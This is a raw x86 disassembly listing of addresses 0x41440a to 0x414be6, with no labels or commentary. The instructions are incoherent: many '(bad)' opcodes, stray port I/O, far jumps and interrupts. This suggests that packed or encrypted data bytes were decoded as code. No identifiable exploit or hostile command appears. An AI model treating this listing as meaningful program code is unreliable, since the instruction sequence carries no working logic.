  41440a:	repnz adc BYTE PTR [ecx+0x19],ah
  41440e:	push   cs
  41440f:	adc    DWORD PTR [ebp-0x6d],ebp
  414412:	push   edx
  414413:	ins    BYTE PTR es:[edi],dx
  414414:	adc    ah,BYTE PTR [esi-0x18]
  414417:	das    
  414418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414419:	hlt    
  41441a:	ud1    edi,DWORD PTR [edx]
  41441d:	inc    edi
  41441e:	(bad)  
  41441f:	fwait
  414420:	push   edx
  414421:	cwde   
  414422:	dec    ebp
  414423:	data16 jnp 0x414441
  414426:	arpl   WORD PTR [eax],bx
  414428:	jl     0x414456
  41442a:	cmp    DWORD PTR [ecx],ebx
  41442c:	loopne 0x41448b
  41442e:	sub    al,0x7
  414430:	cmp    edx,DWORD PTR [ebx]
  414432:	popf   
  414433:	mov    WORD PTR [esi],ds
  414435:	xchg   esp,eax
  414436:	xchg   esp,eax
  414437:	mov    cl,BYTE PTR [eax-0x18]
  41443a:	inc    ebp
  41443b:	enter  0x971c,0x6c
  41443f:	sub    eax,0xfbe4656e
  414444:	or     al,BYTE PTR [edi+0x14b3e75c]
  41444a:	jmp    0xbffc:0x4f12a2be
  414451:	mov    ah,0x92
  414453:	shr    ah,0x6a
  414456:	retf   0x2307
  414459:	stos   DWORD PTR es:[edi],eax
  41445a:	pop    ebx
  41445b:	sahf   
  41445c:	pop    esi
  41445d:	adc    bh,BYTE PTR [ebx-0x5e]
  414460:	inc    edi
  414461:	neg    edi
  414463:	int    0xea
  414465:	and    ch,bl
  414467:	pop    edi
  414468:	push   edx
  414469:	inc    esp
  41446a:	push   ebx
  41446b:	add    al,BYTE PTR [edx]
  41446d:	adc    eax,0xaa1afb07
  414472:	mov    DWORD PTR ds:0x5bedbe6d,edi
  414478:	jg     0x414492
  41447a:	lea    ecx,[ecx]
  41447c:	adc    ebx,esp
  41447e:	out    0xe2,eax
  414480:	punpcklbw mm2,mm7
  414483:	sbb    eax,DWORD PTR [ecx+0x31]
  414486:	div    esi
  414488:	iret   
  414489:	cwde   
  41448a:	in     eax,0x52
  41448c:	push   ss
  41448d:	jns    0x4144b1
  41448f:	jl     0x414493
  414491:	pop    ecx
  414492:	pop    edx
  414493:	(bad)  
  414494:	cld    
  414495:	or     DWORD PTR [edx+0x748c5844],ebp
  41449b:	cld    
  41449c:	rol    esi,1
  41449e:	inc    esi
  41449f:	mov    DWORD PTR [ecx-0x10],eax
  4144a2:	add    al,0x69
  4144a4:	les    ecx,FWORD PTR [esi+0x57]
  4144a7:	push   es
  4144a8:	inc    ecx
  4144a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144aa:	into   
  4144ab:	pop    esp
  4144ac:	je     0x4144ec
  4144ae:	inc    edi
  4144af:	add    dl,ch
  4144b1:	aas    
  4144b2:	sub    BYTE PTR [esi+0x6612821f],dl
  4144b8:	cmc    
  4144b9:	jge    0x4144ec
  4144bb:	retf   
  4144bc:	es (bad) 
  4144bf:	lods   al,BYTE PTR ds:[esi]
  4144c0:	mov    eax,0x417f4ca0
  4144c5:	std    
  4144c6:	mov    ah,0x7f
  4144c8:	and    DWORD PTR [edi],ecx
  4144ca:	push   ebp
  4144cb:	mov    cl,0xf0
  4144cd:	addr16 in al,0x4
  4144d0:	push   esp
  4144d1:	icebp  
  4144d2:	fst    QWORD PTR [ebx]
  4144d4:	in     eax,0x3b
  4144d6:	ins    BYTE PTR es:[edi],dx
  4144d7:	(bad)  
  4144d8:	cmp    al,0xbc
  4144da:	and    dl,BYTE PTR [ebx+ecx*4+0x74]
  4144de:	jae    0x414533
  4144e0:	pop    esi
  4144e1:	aam    0x54
  4144e3:	mov    ebx,0xe920d91b
  4144e8:	inc    esi
  4144e9:	data16 add dh,ah
  4144ec:	mov    ds:0xa39d95a7,al
  4144f1:	retf   0x497f
  4144f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144f5:	push   ds
  4144f6:	imul   esp,DWORD PTR fs:[ecx-0x7d71a93d],0xf9723aaf
  414501:	adc    esi,DWORD PTR [edx-0x49]
  414504:	push   edx
  414505:	rcr    al,0x7c
  414508:	retf   0xe870
  41450b:	and    eax,ecx
  41450d:	add    BYTE PTR [edx-0x50763080],al
  414513:	arpl   WORD PTR [edi],sp
  414515:	sub    eax,0x4888387c
  41451a:	jmp    0x7415223
  41451f:	cmp    al,0x35
  414522:	push   es
  414523:	sahf   
  414524:	shl    BYTE PTR [edx-0x4a40404c],1
  41452a:	lahf   
  41452b:	push   ss
  41452c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41452d:	aas    
  41452e:	test   eax,0x334f1010
  414533:	iret   
  414534:	sbb    edx,eax
  414536:	push   ds
  414537:	pop    ebp
  414538:	fld1   
  41453a:	push   esi
  41453b:	fisttp WORD PTR [esi]
  41453d:	(bad)  
  41453e:	repz pop edi
  414540:	inc    eax
  414541:	xor    BYTE PTR [eax-0x336dbc58],al
  414547:	(bad)  
  414548:	or     ah,BYTE PTR [ebp+0x39]
  41454b:	jo     0x41453b
  41454d:	mov    ds:0x10751db6,al
  414552:	add    DWORD PTR [edx+eiz*8-0x9988777],eax
  414559:	mov    edx,0x13d2a377
  41455e:	out    dx,eax
  41455f:	fstp   QWORD PTR [edx-0x648a11d3]
  414565:	mov    al,BYTE PTR [edi-0xd6d8b02]
  41456b:	adc    al,BYTE PTR [ebx+ecx*8+0x723864c3]
  414572:	clc    
  414573:	clc    
  414574:	sbb    edx,DWORD PTR [ecx-0x124b6527]
  41457a:	mov    WORD PTR [ebx-0x2a],ss
  41457d:	repz and eax,0x708da9a7
  414583:	inc    DWORD PTR [edx]
  414585:	mov    ds:0x6db260c,al
  41458a:	int3   
  41458b:	xchg   ebp,eax
  41458d:	push   ebp
  41458e:	rcl    DWORD PTR [eax-0x21],1
  414591:	pop    ebx
  414592:	push   es
  414593:	retf   0xa2d4
  414596:	cli    
  414597:	jmp    0xd286:0x3426e89f
  41459e:	and    eax,0xf3462916
  4145a3:	xchg   esi,eax
  4145a4:	jge    0x4145dc
  4145a6:	imul   ecx,DWORD PTR [ebx-0x7a41293f],0x3b
  4145ad:	add    al,0x44
  4145af:	mov    ecx,0x852b2119
  4145b4:	out    dx,eax
  4145b5:	(bad)  
  4145b6:	fst    DWORD PTR [edi+0x26]
  4145b9:	(bad)  
  4145ba:	fisttp QWORD PTR [ebx+0x2b]
  4145bd:	dec    edx
  4145be:	cli    
  4145bf:	or     al,0x91
  4145c1:	adc    BYTE PTR [ecx+0x5a],bh
  4145c4:	lock iret 
  4145c6:	sbb    dl,bl
  4145c8:	mov    bh,0x8c
  4145ca:	dec    ebp
  4145cb:	mov    dl,0xd4
  4145cd:	lods   eax,DWORD PTR ds:[esi]
  4145ce:	pop    eax
  4145cf:	cmp    DWORD PTR [esp+esi*8-0x6ab34529],ebx
  4145d6:	cmp    BYTE PTR [edi],0xfc
  4145d9:	mov    edx,0x1f433e26
  4145de:	scas   eax,DWORD PTR es:[edi]
  4145df:	leave  
  4145e0:	mov    WORD PTR [ecx],ds
  4145e2:	inc    ecx
  4145e3:	dec    ecx
  4145e4:	push   0xffffffbf
  4145e6:	adc    DWORD PTR [edi+edx*4-0x2f],esi
  4145ea:	pop    es
  4145eb:	mov    eax,0x3a3d0e8c
  4145f0:	es or  eax,0x80732d05
  4145f6:	jbe    0x4145fd
  4145f8:	pusha  
  4145f9:	add    eax,0x632b6fb3
  4145fe:	adc    eax,DWORD PTR [eax+eax*2+0x259ebe65]
  414605:	jp     0x4145d1
  414607:	xchg   ebp,eax
  414608:	mov    ah,0xe9
  41460a:	outs   dx,BYTE PTR ds:[esi]
  41460b:	hlt    
  41460c:	jno    0x414689
  41460e:	imul   eax,DWORD PTR [edx+0x14],0xffffffc5
  414612:	mov    esi,0xaf26c091
  414617:	xor    eax,0xe65715f4
  41461c:	sar    ecx,1
  41461e:	push   ds
  41461f:	mov    eax,DWORD PTR [ebp-0x58561274]
  414625:	idiv   BYTE PTR [esi]
  414627:	mov    fs,ecx
  414629:	and    ebx,DWORD PTR [ecx]
  41462b:	popf   
  41462c:	mov    al,0x7
  41462e:	loopne 0x4145d3
  414630:	in     eax,0x3a
  414632:	nop
  414633:	lods   eax,DWORD PTR ds:[esi]
  414634:	pop    ss
  414635:	or     al,0x16
  414637:	test   eax,0xe8e714cb
  41463c:	dec    ebp
  41463d:	test   BYTE PTR [ecx+ebp*2],ah
  414640:	sbb    DWORD PTR [edi+0x4d],0xffffff88
  414644:	int    0xc2
  414646:	mov    edx,0x819216c5
  41464b:	dec    ecx
  41464c:	mov    ah,ch
  41464e:	clc    
  41464f:	cmc    
  414650:	imul   ecx,edx,0x7e0a9f70
  414656:	jne    0x4146b0
  414658:	data16 jl 0x414684
  41465b:	inc    ebx
  41465c:	add    al,0x1b
  41465e:	add    cl,BYTE PTR [edx+0x7c]
  414661:	and    ebp,eax
  414663:	sbb    ebx,ebx
  414665:	mov    ecx,0x1f63ac5b
  41466a:	stc    
  41466b:	pop    ebp
  41466c:	push   cs
  41466d:	lds    ecx,FWORD PTR ds:0x74935fbf
  414673:	jle    0x4145fa
  414675:	ds xchg ecx,eax
  414677:	xor    esp,edx
  414679:	fld    TBYTE PTR [edi-0x7dac71eb]
  41467f:	dec    ebp
  414680:	imul   eax,DWORD PTR [eax+0xa516579],0x45ad906e
  41468a:	mov    al,0x2d
  41468c:	enter  0xfdcf,0x5e
  414690:	jg     0x41464b
  414692:	inc    edi
  414693:	inc    esi
  414694:	sbb    eax,0x2b90e941
  414699:	xlat   BYTE PTR ds:[ebx]
  41469a:	mov    ch,0xe5
  41469c:	mov    dh,0x74
  41469e:	shl    BYTE PTR [ebx+0x54691c67],1
  4146a4:	aad    0x7d
  4146a6:	jl     0x414657
  4146a8:	data16 (bad) 
  4146aa:	loope  0x41462f
  4146ac:	jo     0x41466b
  4146ae:	out    dx,al
  4146af:	add    DWORD PTR [ebp+0x38c1f7cb],edx
  4146b5:	scas   al,BYTE PTR es:[edi]
  4146b6:	in     al,dx
  4146b7:	sbb    eax,eax
  4146b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146ba:	(bad)  
  4146bc:	push   es
  4146bd:	pop    es
  4146be:	sar    BYTE PTR [ebp-0x44],0x68
  4146c2:	imul   edx,DWORD PTR [eax+0x3d70d276],0xae07fe54
  4146cc:	jae    0x4146c9
  4146ce:	cmp    al,0xe0
  4146d0:	(bad)  
  4146d1:	enter  0x6a64,0xe4
  4146d5:	lahf   
  4146d6:	xchg   esp,eax
  4146d8:	(bad)  
  4146d9:	xor    al,0x1d
  4146db:	std    
  4146dc:	xchg   BYTE PTR [ecx+0x64],bh
  4146df:	dec    ecx
  4146e0:	call   0x9c9abe13
  4146e5:	mov    edx,0xfab0f61
  4146ea:	or     BYTE PTR [edi],ah
  4146ec:	dec    edi
  4146ed:	clc    
  4146ee:	pop    es
  4146ef:	inc    eax
  4146f0:	cld    
  4146f1:	mov    bh,0xcc
  4146f3:	popf   
  4146f4:	fcomp  DWORD PTR [esi+0x8]
  4146f7:	dec    ebp
  4146f8:	jmp    0x307930d4
  4146fd:	je     0x414693
  4146ff:	jae    0x4146e7
  414701:	fs out 0x6e,eax
  414704:	call   0xc8db:0x28882200
  41470b:	std    
  41470c:	sbb    dl,BYTE PTR [edx+esi*4+0x52e2f4a6]
  414713:	enter  0xe88f,0x20
  414717:	(bad)  
  414718:	adc    eax,0xbd9c6307
  41471d:	out    dx,eax
  41471e:	lods   al,BYTE PTR ds:[esi]
  41471f:	popf   
  414720:	adc    al,0x4f
  414722:	lea    esi,[ecx+edx*8-0x77dcc5f1]
  414729:	add    al,0x6a
  41472b:	lahf   
  41472c:	inc    ebx
  41472d:	fst    DWORD PTR [esi+edi*2+0xa]
  414731:	inc    edx
  414732:	or     esp,DWORD PTR [ebx]
  414734:	mov    edi,0xee421553
  414739:	fs icebp 
  41473b:	mov    cl,0x5
  41473d:	test   DWORD PTR [esi+0x56],edi
  414740:	aam    0x8f
  414742:	sbb    al,BYTE PTR [eax+0x414d7966]
  414748:	pushf  
  414749:	dec    edi
  41474a:	arpl   WORD PTR [esi-0x79],cx
  41474d:	fdiv   st(6),st
  41474f:	loopne 0x4147cc
  414751:	js     0x4146f1
  414753:	inc    esi
  414754:	(bad)  
  414755:	clc    
  414756:	hlt    
  414757:	test   BYTE PTR [edx-0x18118be1],bh
  41475d:	imul   eax,esp,0x25
  414760:	fist   WORD PTR [esi]
  414762:	xchg   esp,eax
  414763:	cmp    BYTE PTR [edx],al
  414765:	gs enter 0x285,0x41
  41476a:	ins    DWORD PTR es:[edi],dx
  41476b:	ss jmp 0x4146fb
  41476e:	mov    gs,WORD PTR [edx+0x2e76d0c2]
  414774:	fistp  DWORD PTR [edi-0x30]
  414777:	sub    BYTE PTR [ecx+0x13f44b7d],bl
  41477d:	push   esp
  41477e:	jmp    0x6b42:0xe02d1bb
  414785:	cmp    BYTE PTR [ebp-0x5d],dh
  414788:	push   ss
  414789:	loopne 0x4147d3
  41478b:	and    eax,0xd720de12
  414790:	jae    0x4147ed
  414792:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414794:	and    edi,DWORD PTR fs:[edx-0x61]
  414798:	push   ecx
  414799:	test   BYTE PTR [edi],dh
  41479b:	mov    bl,0xa5
  41479d:	retf   
  41479e:	fbld   TBYTE PTR [esi+ecx*8]
  4147a1:	int3   
  4147a2:	lock add al,0x2d
  4147a5:	sbb    bh,BYTE PTR ds:0xc41d0436
  4147ab:	jecxz  0x41479b
  4147ad:	push   0x32ae59bc
  4147b2:	jmp    0x6e59f6b6
  4147b7:	fsubr  QWORD PTR [esi+0x852df0c]
  4147bd:	out    dx,eax
  4147be:	(bad)  
  4147bf:	cs inc eax
  4147c1:	mov    eax,ds:0xa18afeb9
  4147c6:	out    0x40,eax
  4147c8:	mov    ecx,0x240020bf
  4147cd:	retf   
  4147ce:	add    DWORD PTR [edx+0x73cd2af6],esp
  4147d4:	push   es
  4147d5:	sub    al,0xf8
  4147d7:	adc    BYTE PTR [esi-0x73007b73],al
  4147dd:	mov    ds:0x932fb3d2,eax
  4147e2:	sbb    eax,0x1cae631f
  4147e7:	sbb    al,BYTE PTR [edi]
  4147e9:	xor    DWORD PTR [eax+0x2e],edi
  4147ec:	test   eax,0xa64ab1b3
  4147f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147f2:	jne    0x4147d3
  4147f4:	call   0x844c:0xc43a4b28
  4147fb:	push   ds
  4147fc:	or     BYTE PTR [si],ah
  4147ff:	fs xchg ecx,eax
  414801:	test   ah,dl
  414803:	cdq    
  414804:	aas    
  414805:	push   0x60
  414807:	mov    ah,0x0
  414809:	push   eax
  41480a:	out    0xf,eax
  41480c:	mov    edi,0x92cbf5c6
  414811:	in     al,dx
  414812:	enter  0xcfe6,0x14
  414816:	stc    
  414817:	idiv   esi
  414819:	cmp    eax,0xe7cd62e
  41481e:	out    0x9f,al
  414820:	sbb    al,0x6d
  414822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414823:	jae    0x414803
  414825:	inc    edi
  414826:	popf   
  414827:	dec    esp
  414828:	lods   eax,DWORD PTR ds:[esi]
  414829:	ret    
  41482a:	add    al,0xc7
  41482c:	arpl   WORD PTR [ebx+0x18],bp
  41482f:	imul   ecx,DWORD PTR [esi-0x32],0x33
  414833:	bnd jl 0x4147cf
  414836:	push   ss
  414837:	adc    esi,esp
  414839:	(bad)  
  41483a:	lods   al,BYTE PTR ds:[esi]
  41483b:	or     cl,BYTE PTR [edx+0x5c2a6359]
  414841:	adc    ebx,DWORD PTR [esp+edi*4-0x46d924e9]
  414848:	mov    ecx,ss
  41484a:	mov    ecx,0x39ae783f
  41484f:	pop    ds
  414850:	(bad)  
  414851:	cmp    ch,dh
  414853:	test   al,0x9e
  414855:	push   ebx
  414856:	sbb    al,0xd6
  414858:	mov    WORD PTR [edx+0x30],gs
  41485b:	aas    
  41485c:	mov    edi,0x85e5ed8e
  414861:	cli    
  414862:	push   cs
  414863:	jbe    0x414891
  414865:	and    edi,0x25
  414868:	in     eax,0x4d
  41486a:	xor    ecx,DWORD PTR [eax+0x79]
  41486d:	sub    dl,cl
  41486f:	xor    BYTE PTR [edi],ch
  414871:	(bad)  
  414872:	imul   esp,DWORD PTR [eax+ebx*4+0x76],0x18441e88
  41487a:	mov    BYTE PTR [edi-0x329312ea],al
  414880:	xchg   ebp,eax
  414881:	sub    dh,BYTE PTR [edi]
  414883:	les    ebx,FWORD PTR [edi-0x5e86915d]
  414889:	add    eax,0x1380fe5
  41488e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41488f:	jae    0x414860
  414891:	das    
  414892:	leave  
  414893:	loopne 0x4148e8
  414895:	and    dh,ah
  414897:	push   eax
  414898:	cmp    eax,0xe1f99edc
  41489d:	sub    eax,DWORD PTR [ebp-0x70]
  4148a0:	ins    BYTE PTR es:[edi],dx
  4148a1:	mov    edi,0x2c353944
  4148a6:	lods   al,BYTE PTR ds:[esi]
  4148a7:	add    DWORD PTR [ebp-0x1f],0xf24a0fae
  4148ae:	inc    edx
  4148af:	add    eax,0x5b87b23b
  4148b4:	xchg   DWORD PTR [ebp+0x39],esp
  4148b7:	dec    edi
  4148b8:	sub    ebp,DWORD PTR [esi+0x95c7303]
  4148be:	push   cs
  4148bf:	mov    ebx,0x9f620e73
  4148c4:	sub    esp,DWORD PTR [ecx+ebx*8+0x2562d7a5]
  4148cb:	jp     0x4148d6
  4148cd:	out    0xe3,al
  4148cf:	out    0x51,eax
  4148d1:	cmp    DWORD PTR [edi+0x7b28d1b3],eax
  4148d7:	lock cwde 
  4148d9:	aad    0x19
  4148db:	sahf   
  4148dc:	inc    esi
  4148dd:	in     eax,dx
  4148de:	inc    ecx
  4148df:	push   edi
  4148e0:	sahf   
  4148e1:	push   ds
  4148e2:	jb     0x4148cd
  4148e4:	repz xchg edi,eax
  4148e6:	pushf  
  4148e7:	cs push 0x2bf0614a
  4148ed:	sbb    dh,BYTE PTR [edi]
  4148ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148f0:	dec    esi
  4148f1:	sub    eax,0x75db94e3
  4148f6:	jne    0x414955
  4148f8:	inc    bp
  4148fa:	mov    ebp,0xaeea2ea4
  4148ff:	xchg   edx,eax
  414900:	sub    al,0x46
  414902:	sub    ah,BYTE PTR [esi-0x1935fd2a]
  414908:	dec    ebx
  414909:	dec    esp
  41490a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41490b:	mov    ds:0xaeeb006c,al
  414910:	or     DWORD PTR [ecx],ebx
  414912:	mov    bl,0xb4
  414914:	fmul   DWORD PTR [ebp+0x1f]
  414917:	loop   0x4148b5
  414919:	and    DWORD PTR [edi],esp
  41491b:	mov    ebp,0x43cc6f72
  414920:	sub    DWORD PTR [eax],edi
  414922:	push   0xffffffc8
  414924:	retf   0x4f36
  414927:	stc    
  414928:	movq   QWORD PTR [eax],mm2
  41492b:	in     al,dx
  41492c:	or     dl,BYTE PTR cs:[eax]
  41492f:	push   ds
  414930:	(bad)  
  414931:	push   ds
  414932:	dec    edi
  414933:	or     BYTE PTR [eax+0x79],al
  414936:	out    0xaf,al
  414938:	and    edx,ebx
  41493a:	jne    0x41491e
  41493c:	pop    edx
  41493d:	xlat   BYTE PTR ds:[ebx]
  41493e:	add    eax,0xbac61087
  414943:	popf   
  414944:	xchg   edx,eax
  414945:	aas    
  414946:	xchg   ecx,eax
  414947:	jnp    0x4148f9
  414949:	mov    ebp,DWORD PTR [eax+eiz*4+0x5e3b5819]
  414950:	clc    
  414951:	jl     0x414903
  414953:	cmp    esi,0x9fd99e67
  414959:	xor    al,0xbe
  41495b:	jns    0x41495c
  41495d:	addr16 call 0x2bcdb59d
  414963:	fadd   QWORD PTR [esi+0x4f]
  414966:	cmp    BYTE PTR [ecx],ah
  414968:	hlt    
  414969:	xchg   BYTE PTR [edi+0x14],cl
  41496c:	dec    eax
  41496d:	inc    edx
  41496e:	arpl   WORD PTR [edx],sp
  414970:	push   ecx
  414971:	and    bl,BYTE PTR [esp+ebx*4]
  414974:	test   BYTE PTR [eax+0x68f46fe0],cl
  41497a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41497b:	and    eax,0xc8e796f3
  414980:	cmc    
  414981:	imul   esi,DWORD PTR [eax],0x2ec39515
  414987:	mov    bh,0x41
  414989:	dec    ebp
  41498a:	das    
  41498b:	adc    DWORD PTR [ecx+ebp*8-0x2e],edx
  41498f:	sbb    BYTE PTR [esi-0x3e],dh
  414992:	add    esp,DWORD PTR [esi*2+0x4a37ab73]
  414999:	xchg   esi,eax
  41499a:	and    esi,ebx
  41499c:	dec    edx
  41499d:	mov    ebx,DWORD PTR [eax]
  41499f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149a0:	test   DWORD PTR [ebx],0x805b4056
  4149a6:	daa    
  4149a7:	sub    cl,0xff
  4149aa:	jnp    0x414939
  4149ac:	or     BYTE PTR [ecx+0x5b],al
  4149af:	sub    BYTE PTR [edi],dh
  4149b1:	sub    BYTE PTR [edx-0x2fc162fe],dh
  4149b7:	push   esi
  4149b8:	(bad)  
  4149b9:	sbb    BYTE PTR [eax-0x78],dh
  4149bc:	sub    ah,bh
  4149be:	dec    BYTE PTR [esi-0x405e516a]
  4149c4:	jl     0x414a06
  4149c6:	mov    edi,0x51d9655d
  4149cb:	sbb    eax,DWORD PTR [edi+0x24]
  4149ce:	sahf   
  4149cf:	shl    BYTE PTR [esi],1
  4149d1:	and    al,0xf9
  4149d3:	ror    DWORD PTR [ebx],0x15
  4149d6:	sub    bh,BYTE PTR [edx-0x58121789]
  4149dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149dd:	sbb    al,0xdc
  4149df:	ja     0x4149fa
  4149e1:	inc    ebp
  4149e2:	fcom   st(0)
  4149e4:	stc    
  4149e5:	sbb    al,0xed
  4149e7:	adc    ebx,DWORD PTR [esi-0x3952b71b]
  4149ed:	push   ebp
  4149ee:	(bad)  
  4149ef:	or     eax,0xdf5ec716
  4149f4:	std    
  4149f5:	dec    eax
  4149f6:	aam    0xda
  4149f8:	xor    BYTE PTR [edi+0x55],bl
  4149fb:	inc    eax
  4149fc:	pop    edx
  4149fd:	jnp    0x414a65
  4149ff:	cld    
  414a00:	jge    0x4149bb
  414a02:	xor    al,0xb4
  414a05:	sbb    eax,edx
  414a07:	lods   eax,DWORD PTR ds:[esi]
  414a08:	daa    
  414a09:	lds    edi,FWORD PTR [edi+0x7f]
  414a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a0e:	and    eax,0x5a79654f
  414a13:	sti    
  414a14:	mov    edx,0x32f61c95
  414a19:	rcl    BYTE PTR [ebx],1
  414a1b:	fiadd  DWORD PTR [eax]
  414a1d:	imul   esi,DWORD PTR [ebp-0x22339432],0x2e76c44b
  414a27:	pusha  
  414a28:	retf   0x6981
  414a2b:	(bad)  
  414a2c:	sbb    esi,DWORD PTR [edi-0x5a]
  414a2f:	mov    dh,BYTE PTR [ebx]
  414a31:	int3   
  414a32:	inc    ebx
  414a33:	add    BYTE PTR [esi],ch
  414a35:	enter  0x2d4e,0x9d
  414a39:	mov    eax,0x65acd292
  414a3e:	adc    ch,BYTE PTR [edx+edi*8]
  414a41:	call   0xbf09:0x49d980a5
  414a48:	mov    ds:0x6529df05,eax
  414a4d:	mov    al,0x33
  414a4f:	(bad)  
  414a50:	and    edi,DWORD PTR ss:[edi+0x5c]
  414a54:	jmp    0xaef7:0xd3db0135
  414a5b:	cmp    ch,BYTE PTR [eax*2-0x71a9c509]
  414a62:	cli    
  414a63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a64:	out    0x4f,al
  414a66:	or     eax,0x350bfef8
  414a6b:	repnz dec edi
  414a6d:	xor    esp,esi
  414a6f:	sub    al,0x73
  414a71:	dec    edx
  414a72:	pop    esp
  414a73:	jmp    0xd32:0x12d0fcea
  414a7a:	push   ds
  414a7b:	mov    al,0xf0
  414a7d:	mov    cl,0xd3
  414a7f:	cwde   
  414a80:	in     eax,dx
  414a81:	stos   DWORD PTR es:[edi],eax
  414a82:	enter  0xc32c,0x43
  414a86:	lahf   
  414a87:	fidivr WORD PTR [eax]
  414a89:	test   eax,0x8baf4328
  414a8e:	repnz outs dx,BYTE PTR ds:[esi]
  414a90:	imul   ebx,DWORD PTR [eax-0x3d],0x25c6d5c7
  414a97:	jno    0x414ae0
  414a99:	fs in  eax,dx
  414a9b:	mov    ah,0xa1
  414a9d:	push   ebp
  414a9e:	(bad)  
  414a9f:	les    ebx,FWORD PTR [esi-0x23d3990b]
  414aa5:	js     0x414a91
  414aa7:	fs es es data16 cmc 
  414aac:	mov    edx,0xc5f4a0a6
  414ab1:	div    DWORD PTR [ebx+0x45]
  414ab4:	int    0x87
  414ab6:	cmp    al,0x41
  414ab8:	cmp    DWORD PTR [ebx+0x1e55f141],ebx
  414abe:	repz push cs
  414ac0:	sbb    BYTE PTR [esi-0x45b3952f],al
  414ac6:	cli    
  414ac7:	inc    edx
  414ac8:	arpl   WORD PTR ds:0xddbfd9d0,dx
  414ace:	and    ecx,esp
  414ad0:	je     0x414aa5
  414ad2:	rcl    DWORD PTR cs:[ebp-0x40],cl
  414ad6:	or     ecx,DWORD PTR [ebx]
  414ad8:	mov    BYTE PTR es:0xbd33da9c,0xbe
  414ae0:	iret   
  414ae1:	sbb    al,0x8b
  414ae3:	mov    BYTE PTR [eax-0x6a],ch
  414ae6:	dec    edi
  414ae7:	popa   
  414ae8:	es ret 0x3a89
  414aec:	(bad)  
  414aed:	out    0x3a,eax
  414aef:	xchg   esp,eax
  414af0:	in     al,0xc5
  414af2:	cmp    cl,cl
  414af4:	int    0xdd
  414af6:	xchg   ebx,eax
  414af7:	sub    DWORD PTR [esi],esp
  414af9:	jl     0x414b52
  414afb:	(bad)  
  414afc:	push   ebx
  414afd:	test   al,0x5b
  414aff:	jl     0x414b47
  414b01:	(bad)  
  414b02:	jmp    FWORD PTR [ecx-0x28]
  414b05:	cdq    
  414b06:	mov    esi,0x5630985b
  414b0b:	hlt    
  414b0c:	enter  0x93b5,0x52
  414b10:	mov    eax,ds:0xe6dbe094
  414b15:	(bad)  
  414b16:	icebp  
  414b17:	retf   
  414b18:	mov    ah,0xdc
  414b1a:	pop    ebp
  414b1b:	jno    0x414b4e
  414b1d:	icebp  
  414b1e:	clc    
  414b1f:	add    al,0xf6
  414b21:	cmp    cl,BYTE PTR [eax+0x2f]
  414b24:	sub    al,0xc5
  414b26:	push   ecx
  414b27:	or     eax,0x391befb2
  414b2c:	add    al,0xec
  414b2e:	pushf  
  414b2f:	sti    
  414b30:	test   esi,edi
  414b32:	xchg   ecx,eax
  414b33:	ds aam 0x80
  414b36:	call   0x6929:0xe779f967
  414b3d:	out    dx,eax
  414b3e:	inc    esp
  414b3f:	sub    ebp,DWORD PTR [ebp-0x8858181]
  414b45:	dec    eax
  414b46:	outs   dx,DWORD PTR ds:[esi]
  414b47:	imul   ebx,DWORD PTR [ecx],0xfffffff9
  414b4a:	adc    eax,0xaab75c4
  414b4f:	cwde   
  414b50:	(bad)  
  414b52:	jp     0x414b89
  414b54:	sub    cl,BYTE PTR [ecx]
  414b56:	jl     0x414b02
  414b58:	mov    ch,0xc
  414b5a:	mov    bl,0xe2
  414b5c:	rol    ch,0x6
  414b5f:	push   edx
  414b60:	adc    eax,DWORD PTR [esi]
  414b62:	retf   0x9d1c
  414b65:	out    dx,eax
  414b66:	not    dl
  414b68:	mov    BYTE PTR [edx],ch
  414b6a:	push   ds
  414b6b:	and    edi,DWORD PTR [edi+0x4ca72b82]
  414b71:	fdivr  DWORD PTR [eax+0x207c25fc]
  414b77:	in     eax,0x86
  414b79:	aam    0x64
  414b7b:	jo     0x414b8e
  414b7d:	inc    ecx
  414b7e:	mov    bh,0x3b
  414b80:	std    
  414b81:	frstor [eax+0x16cd94d0]
  414b87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b88:	xor    eax,DWORD PTR [edx-0x1a]
  414b8b:	sahf   
  414b8c:	aad    0xdb
  414b8e:	sbb    eax,0x6f2e6a46
  414b93:	xchg   ecx,eax
  414b94:	sub    edx,eax
  414b96:	(bad)  
  414b98:	mov    ecx,0x934c8a14
  414b9d:	inc    edx
  414b9e:	xchg   ebx,eax
  414b9f:	pop    ds
  414ba0:	xchg   DWORD PTR [ecx-0x4470db11],edx
  414ba6:	arpl   WORD PTR [edx+edx*4+0x7dbeca95],cx
  414bad:	std    
  414bae:	test   DWORD PTR [ecx+0x65],ebp
  414bb1:	scas   al,BYTE PTR es:[edi]
  414bb2:	mov    eax,ds:0x903c0639
  414bb7:	inc    ebx
  414bb8:	or     eax,0xd1d94050
  414bbd:	out    0xc2,eax
  414bbf:	out    dx,eax
  414bc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bc1:	adc    DWORD PTR ds:0x11561d17,edx
  414bc7:	mov    bl,0xfe
  414bc9:	je     0x414c36
  414bcb:	bound  ecx,QWORD PTR [edi-0x3c]
  414bce:	xor    edx,DWORD PTR [ebp-0xb]
  414bd1:	loopne 0x414bf2
  414bd3:	sbb    dl,ch
  414bd5:	mov    ds:0x25ac9021,eax
  414bda:	push   ss
  414bdb:	or     BYTE PTR [esi-0x50a74897],bh
  414be1:	mov    bh,al
  414be3:	outs   dx,BYTE PTR ds:[esi]
  414be4:	aam    0xe1
  414be6:	cwde   
